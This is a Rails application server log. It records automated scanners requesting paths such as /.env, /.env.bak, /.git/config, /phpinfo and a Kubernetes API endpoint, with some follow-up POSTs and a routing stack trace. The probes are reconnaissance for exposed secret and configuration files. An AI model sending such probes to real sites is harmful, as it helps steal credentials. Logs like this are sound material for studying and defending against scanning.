# Logfile created on 2023-03-12 01:07:03 +0900 by logger.rb/v1.5.0
I, [2023-03-12T01:07:03.783342 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 01:07:03 +0900
I, [2023-03-12T01:07:03.786469 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T01:07:03.786514 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T01:07:03.788419 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T01:07:03.792484 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 4.1ms | Allocations: 299)
I, [2023-03-12T01:07:03.792936 #2360582]  INFO -- : Completed 200 OK in 6ms (Views: 4.7ms | Allocations: 506)
I, [2023-03-12T01:15:25.841709 #2360580]  INFO -- : Started GET "/" for 64.62.197.86 at 2023-03-12 01:15:25 +0900
I, [2023-03-12T01:15:25.842380 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T01:15:25.842820 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T01:15:25.844937 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.2ms | Allocations: 299)
I, [2023-03-12T01:15:25.845141 #2360580]  INFO -- : Completed 200 OK in 3ms (Views: 2.5ms | Allocations: 521)
I, [2023-03-12T01:29:31.646452 #2360582]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-12 01:29:31 +0900
I, [2023-03-12T01:29:31.647057 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T01:29:31.647820 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T01:29:31.648662 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T01:29:31.648843 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T02:17:50.291630 #2360580]  INFO -- : Started GET "/" for 193.32.162.159 at 2023-03-12 02:17:50 +0900
I, [2023-03-12T02:17:50.292610 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T02:17:50.293356 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T02:17:50.293982 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T02:17:50.294159 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-12T02:18:00.554846 #2360582]  INFO -- : Started GET "/dispatch.asp" for 193.32.162.159 at 2023-03-12 02:18:00 +0900
I, [2023-03-12T02:18:00.555484 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T02:18:00.555525 #2360582]  INFO -- :   Parameters: {"all"=>"dispatch"}
I, [2023-03-12T02:18:00.556058 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T02:18:00.556805 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T02:18:00.560563 #2360582]  INFO -- : Completed 200 OK in 5ms (Views: 4.7ms | Allocations: 514)
I, [2023-03-12T02:25:31.388400 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 02:25:31 +0900
I, [2023-03-12T02:25:31.389059 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T02:25:31.389107 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T02:25:31.389525 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T02:25:31.390615 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-03-12T02:25:31.390778 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 505)
I, [2023-03-12T02:31:25.090437 #2360582]  INFO -- : Started GET "/.git/HEAD" for 194.26.229.64 at 2023-03-12 02:31:25 +0900
I, [2023-03-12T02:31:25.091074 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T02:31:25.091115 #2360582]  INFO -- :   Parameters: {"all"=>".git/HEAD"}
I, [2023-03-12T02:31:25.091544 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T02:31:25.092171 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T02:31:25.092354 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T03:20:19.737176 #2360580]  INFO -- : Started GET "/" for 151.241.89.11 at 2023-03-12 03:20:19 +0900
I, [2023-03-12T03:20:19.737763 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T03:20:19.738170 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T03:20:19.738964 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-12T03:20:19.739136 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 512)
I, [2023-03-12T03:20:37.251713 #2360582]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-12 03:20:37 +0900
I, [2023-03-12T03:20:37.252313 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T03:20:37.252352 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T03:20:37.252770 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T03:20:37.253474 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T03:20:37.254440 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 521)
I, [2023-03-12T03:20:38.056151 #2360582]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-12 03:20:38 +0900
F, [2023-03-12T03:20:38.056485 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T03:43:37.195560 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 03:43:37 +0900
I, [2023-03-12T03:43:37.196171 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T03:43:37.196269 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T03:43:37.196785 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T03:43:37.197449 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-12T03:43:37.197767 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 504)
I, [2023-03-12T03:43:59.998083 #2360582]  INFO -- : Started GET "/" for 36.80.248.222 at 2023-03-12 03:43:59 +0900
I, [2023-03-12T03:43:59.998659 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T03:43:59.999080 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T03:44:00.000045 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T03:44:00.000233 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 513)
I, [2023-03-12T03:58:08.637469 #2360580]  INFO -- : Started GET "/apis/apps/v1/namespaces/kube-system/daemonsets" for 45.134.140.161 at 2023-03-12 03:58:08 +0900
I, [2023-03-12T03:58:08.638084 #2360580]  INFO -- : Processing by UserController#index as JSON
I, [2023-03-12T03:58:08.638126 #2360580]  INFO -- :   Parameters: {"all"=>"apis/apps/v1/namespaces/kube-system/daemonsets"}
I, [2023-03-12T03:58:08.638527 #2360580]  INFO -- : Completed 406 Not Acceptable in 0ms (Allocations: 186)
F, [2023-03-12T03:58:08.639099 #2360580] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/json"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-03-12T04:06:39.308725 #2360582]  INFO -- : Started GET "/.env" for 18.232.38.194 at 2023-03-12 04:06:39 +0900
I, [2023-03-12T04:06:39.309403 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:06:39.309449 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T04:06:39.309869 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:06:39.310478 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T04:06:39.310648 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 521)
I, [2023-03-12T04:06:40.037136 #2360582]  INFO -- : Started POST "/.env" for 18.232.38.194 at 2023-03-12 04:06:40 +0900
F, [2023-03-12T04:06:40.037488 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/.env"):
  
I, [2023-03-12T04:08:38.191966 #2360580]  INFO -- : Started GET "/_profiler/phpinfo" for 18.232.38.194 at 2023-03-12 04:08:38 +0900
I, [2023-03-12T04:08:38.192593 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:08:38.192632 #2360580]  INFO -- :   Parameters: {"all"=>"_profiler/phpinfo"}
I, [2023-03-12T04:08:38.193137 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:08:38.193779 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T04:08:38.193961 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T04:08:39.012524 #2360580]  INFO -- : Started POST "/" for 18.232.38.194 at 2023-03-12 04:08:39 +0900
F, [2023-03-12T04:08:39.012902 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T04:40:06.696108 #2360580]  INFO -- : Started GET "/" for 87.236.176.189 at 2023-03-12 04:40:06 +0900
I, [2023-03-12T04:40:06.696787 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:40:06.697300 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:40:06.697925 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T04:40:06.698101 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T04:56:37.195481 #2360582]  INFO -- : Started GET "/" for 193.32.162.159 at 2023-03-12 04:56:37 +0900
I, [2023-03-12T04:56:37.196090 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:56:37.196529 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:56:37.197212 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T04:56:37.197392 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T04:56:47.457696 #2360580]  INFO -- : Started GET "/dispatch.asp" for 193.32.162.159 at 2023-03-12 04:56:47 +0900
I, [2023-03-12T04:56:47.458410 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:56:47.458458 #2360580]  INFO -- :   Parameters: {"all"=>"dispatch"}
I, [2023-03-12T04:56:47.458991 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-03-12T04:56:47.459827 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T04:56:47.460052 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 514)
I, [2023-03-12T04:57:18.945529 #2360582]  INFO -- : Started GET "/" for 167.94.138.124 at 2023-03-12 04:57:18 +0900
I, [2023-03-12T04:57:18.946300 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T04:57:18.946723 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:57:18.947468 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T04:57:18.947630 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 513)
I, [2023-03-12T04:57:19.271791 #2360580]  INFO -- : Started GET "/" for 167.94.138.124 at 2023-03-12 04:57:19 +0900
I, [2023-03-12T04:57:19.272780 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T04:57:19.273561 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T04:57:19.274523 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T04:57:19.274891 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 521)
I, [2023-03-12T05:03:00.583899 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 05:03:00 +0900
I, [2023-03-12T05:03:00.584507 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:03:00.584546 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T05:03:00.585922 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:03:00.586587 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-12T05:03:00.586761 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 504)
I, [2023-03-12T05:21:00.353472 #2360580]  INFO -- : Started GET "/.git/config" for 139.144.118.227 at 2023-03-12 05:21:00 +0900
I, [2023-03-12T05:21:00.354103 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:21:00.354146 #2360580]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-12T05:21:00.357828 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:21:00.364231 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 6.4ms | Allocations: 299)
I, [2023-03-12T05:21:00.364512 #2360580]  INFO -- : Completed 200 OK in 10ms (Views: 10.1ms | Allocations: 521)
I, [2023-03-12T05:37:06.597323 #2360582]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-12 05:37:06 +0900
I, [2023-03-12T05:37:06.598174 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:37:06.598679 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:37:06.599418 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T05:37:06.599757 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T05:41:45.140655 #2360580]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-12 05:41:45 +0900
I, [2023-03-12T05:41:45.141360 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:41:45.141830 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:41:45.143255 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 299)
I, [2023-03-12T05:41:45.143496 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 521)
I, [2023-03-12T05:41:47.739355 #2360582]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-12 05:41:47 +0900
I, [2023-03-12T05:41:47.740052 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:41:47.740627 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:41:47.741297 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T05:41:47.741471 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T05:51:36.936489 #2360580]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-12 05:51:36 +0900
I, [2023-03-12T05:51:36.937252 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T05:51:36.937301 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T05:51:36.937741 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T05:51:36.938359 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T05:51:36.938536 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T05:51:37.518738 #2360582]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-12 05:51:37 +0900
F, [2023-03-12T05:51:37.519462 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:18:59.802504 #2360580]  INFO -- : Started GET "/" for 193.32.162.159 at 2023-03-12 06:18:59 +0900
I, [2023-03-12T06:18:59.803120 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:18:59.803579 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:18:59.804446 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T06:18:59.804647 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T06:19:10.066708 #2360582]  INFO -- : Started GET "/dispatch.asp" for 193.32.162.159 at 2023-03-12 06:19:10 +0900
I, [2023-03-12T06:19:10.067344 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:19:10.067385 #2360582]  INFO -- :   Parameters: {"all"=>"dispatch"}
I, [2023-03-12T06:19:10.067813 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:19:10.071844 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 4.0ms | Allocations: 299)
I, [2023-03-12T06:19:10.072105 #2360582]  INFO -- : Completed 200 OK in 5ms (Views: 4.4ms | Allocations: 514)
I, [2023-03-12T06:19:56.787849 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 06:19:56 +0900
I, [2023-03-12T06:19:56.788540 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:19:56.788587 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T06:19:56.789098 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:19:56.789718 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T06:19:56.789864 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-12T06:22:35.576477 #2360582]  INFO -- : Started GET "/_profiler/phpinfo" for 34.229.144.89 at 2023-03-12 06:22:35 +0900
I, [2023-03-12T06:22:35.577273 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:35.577325 #2360582]  INFO -- :   Parameters: {"all"=>"_profiler/phpinfo"}
I, [2023-03-12T06:22:35.578074 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:35.578741 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T06:22:35.578934 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T06:22:35.890377 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:35 +0900
F, [2023-03-12T06:22:35.890714 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:36.179318 #2360582]  INFO -- : Started GET "/.env" for 34.229.144.89 at 2023-03-12 06:22:36 +0900
I, [2023-03-12T06:22:36.180428 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:36.180480 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T06:22:36.180976 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:36.181668 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-12T06:22:36.181849 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 515)
I, [2023-03-12T06:22:36.477625 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:36 +0900
F, [2023-03-12T06:22:36.477973 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:36.768718 #2360582]  INFO -- : Started GET "/.env.save" for 34.229.144.89 at 2023-03-12 06:22:36 +0900
I, [2023-03-12T06:22:36.769396 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:36.769442 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T06:22:36.769859 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:36.770467 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.6ms | Allocations: 298)
I, [2023-03-12T06:22:36.770627 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 507)
I, [2023-03-12T06:22:37.076396 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:37 +0900
F, [2023-03-12T06:22:37.076758 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:37.382462 #2360580]  INFO -- : Started GET "/.env.bak" for 34.229.144.89 at 2023-03-12 06:22:37 +0900
I, [2023-03-12T06:22:37.383162 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:37.383208 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T06:22:37.383824 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:37.384545 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T06:22:37.384733 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-03-12T06:22:37.679070 #2360582]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:37 +0900
F, [2023-03-12T06:22:37.679407 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:37.973862 #2360582]  INFO -- : Started GET "/phpinfo" for 34.229.144.89 at 2023-03-12 06:22:37 +0900
I, [2023-03-12T06:22:37.974464 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:37.974506 #2360582]  INFO -- :   Parameters: {"all"=>"phpinfo"}
I, [2023-03-12T06:22:37.974923 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:37.975527 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.6ms | Allocations: 298)
